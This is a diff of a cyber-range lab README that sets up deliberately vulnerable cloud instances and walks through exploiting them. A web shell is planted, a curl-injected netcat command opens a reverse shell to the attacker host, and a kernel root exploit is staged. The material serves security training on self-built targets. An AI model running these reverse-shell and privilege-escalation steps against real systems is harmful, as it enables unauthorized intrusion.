@@ -2,15 +2,13 @@
 
 ## Artifacts
 
-* [Qwiklabs site](https://ce.qwiklabs.com/focuses/12629) 
-* [Setup script](setup.sh), launch from Cloud Shell
-* [Blue Ansible playbook](blue.yml)
-* [Red Ansible playbook](red.yml) ???
-* [Terraform script](main.tf)
+* [Terraform Build script](main.tf)
+* [Terraform Variables file](terraform.tfvars)
+* [Blue Ansible playbook](blue35370.yml)
 
 ## Instructions
 
-1. Select your qwiklabs project from the dropdown menu in the top blue bar, i.e., ```qwiklabs-gcp-fa603bc97e11059a```
+1. Login to https://console.cloud.google.com/
 2. Start the Cloud Shell
 3. Clone this repo
 
@@ -27,32 +25,47 @@ terraform apply
 ```
 
 5. SSH to the blue 35370 instance `gcloud compute ssh blue-35370 --zone us-east4-a`
-6. Run Ansible script to make this instance vulnerable to Shellshock and libfutex
+6. Accept SSH Key Generation and Set SSH Passphrase
 
 ```
-cd \
-sudo ansible-playbook meetup/20190321/blue.yml
+Do you want to continue (Y/n)?  Y
+Enter passphrase (empty for no passphrase): <PASSPHRASE>
 ```
 
-9. Wait for the instance to reboot, then re-log in
+7. Clone the meetup, cyber-range-target, and exploit-curation repos
 
 ```
-gcloud compute ssh blue-1 --zone us-east4-a
+git clone https://github.com/MikeStorrs/cyber.git
+git clone https://github.com/redteam-project/cyber-range-target
+git clone https://github.com/redteam-project/exploit-curation
+```
+
+8. Run Ansible script to make this instance vulnerable to Shellshock and libfutex
+
+```
+cd /
+sudo ansible-playbook cyber/blue35370.yml > ~/ansible.out
+```
+
+9. Wait for the instance to reboot, then re-log in and remove Supervisor Mode Access Prevention and (NOTE NEED TO ADD nosmap / nosmep to Ansible Script)
+
+```
+gcloud compute ssh blue-35370 --zone us-east4-a
+sudo grubby --args "nosmap nosmep" --update-kernel /boot/vmlinuz-3.10.0-123.1.2.el7.x86_64
+sudo reboot
 ```
 
 10. Now scan for exploitable vulnerabilities with `lem`
 
 ```
-sudo su -
-virtualenv venv
-source venv/bin/activate
-pip install lem
-lem host assess --curation exploit-curation --kind stride --score 090000
-lem exploit copy --id 35146 --source exploit-database --destination /var/www/html --curation exploit-curation
-mv /var/www/html/exploit-database-35146.txt /var/www/html/index.php
+cd /
+sudo pip install lem
+sudo lem host assess --curation exploit-curation --kind stride --score 090000
+sudo lem exploit copy --id 35146 --source exploit-database --destination /var/www/html --curation exploit-curation
+sudo mv /var/www/html/exploit-database-35146.txt /var/www/html/index.php
 ```
 
-11. Our remote code execution vulnerability is now ready to exploit. Now start two new Cloud Shell instances and ssh to red-1 from both.
+11. Our remote code execution vulnerability is now ready to exploit. Now start two new Cloud Shell tabs and ssh to red-1 from both.
 
 ```
 gcloud compute ssh red-1 --zone us-east4-a
@@ -61,17 +74,16 @@ gcloud compute ssh red-1 --zone us-east4-a
 12. In the first `red-1` shell, install Netcat and start a listener on port 4444.
 
 ```
-yum install -y nmap-ncat
 nc -nlv 4444
 ```
 
-13. In the second `red-1` shell, exploit the Shellshock vulnerability we staged in step 10. Replace the IP addresses with your blue-1 and red-1 IPs, respectively.
+13. In the second `red-1` shell, exploit the Shellshock vulnerability we staged in step 10. Replace the 10.150.0.3 IP address with your blue-35370 Internal IP and the 10.150.0.2 with your red-1 Internal IP.
 
 ```
-curl -X GET 'http://10.150.0.6/index.php?cmd=nc%20-nv%2010.150.0.7%204444%20-e%20/bin/bash'
+curl -X GET 'http://10.150.0.3/index.php?cmd=nc%20-nv%2010.150.0.2%204444%20-e%20/bin/bash'
 ```
 
-14. Now in the first `red-1` shell, you should have a reverse shell to `blue-1`. Use this Python trick to get a tty and invoke bash.
+14. Now in the first `red-1` shell, you should have a reverse shell to `blue-35370`. Use this Python trick to get a tty and invoke bash.
 
 ```
 python -c 'import pty; pty.spawn("/bin/sh")'
@@ -90,7 +102,7 @@ lem host assess --curation exploit-curation --kind stride --score 000009
 
 Note that there is currently a [bug](https://github.com/redteam-project/lem/issues/5) in lem that prevents the exploit that maps to CVE-2014-3153 from returning, but for purposes of this lab we know that it maps to EDBID 35370.
 
-16. Stage the exploit and pop root. **EDIT** - this doesn't appear to work , which could be the result of environment (GCE), or that cyber-range-target didn't properly downgrade the kernel rpm to a version with the libfutex vulnerability. In a way, this is exactly why this project matters -- it's hard to make cyber ranges repeatable, infrastructure-as-code environments. See the relevant [exploit-curation enhancement bug](https://github.com/redteam-project/exploit-curation/issues/1) to track progress, and check back later for an updated lab.
+16. Stage the exploit and pop root. 
 
 ```
 lem exploit copy --curation /tmp/exploit-curation --source exploit-database --id 35370 --destination /tmp/
